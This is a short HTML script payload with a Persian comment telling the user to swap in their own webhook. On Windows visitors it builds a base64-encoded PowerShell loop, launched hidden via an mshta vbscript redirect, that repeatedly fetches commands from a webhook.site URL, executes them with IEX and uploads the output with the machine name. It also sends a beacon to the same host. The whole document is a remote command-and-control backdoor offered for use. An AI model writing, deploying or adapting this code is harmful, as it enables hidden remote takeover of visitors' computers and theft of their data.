<script>
if (navigator.userAgent.indexOf("Windows") > -1) {
  const webhook = "	https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d"; // ← این رو عوض کن با مال خودت
  const pc = "${env:COMPUTERNAME}-${env:USERNAME}";

  const rev = `
  while(1){
    try{
      $r = (New-Object Net.WebClient).DownloadString('${webhook}?cmd='+(Get-Date -U %s));
      if($r){
        $o = IEX $r -ErrorAction Stop | Out-String;
        (New-Object Net.WebClient).UploadString('${webhook}','result='+$o+'&pc='+pc);
      }
    }catch{}
    Start-Sleep -Seconds 5
  }
  `.replace(/\n/g,' ').trim();

  const b64 = btoa(unescape(encodeURIComponent(rev)));

  setTimeout(() => {
    location = "mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -enc " + b64 + "\",0)(window.close())";
  }, 1200);

  fetch("${webhook}?beacon=started");
}
</script>
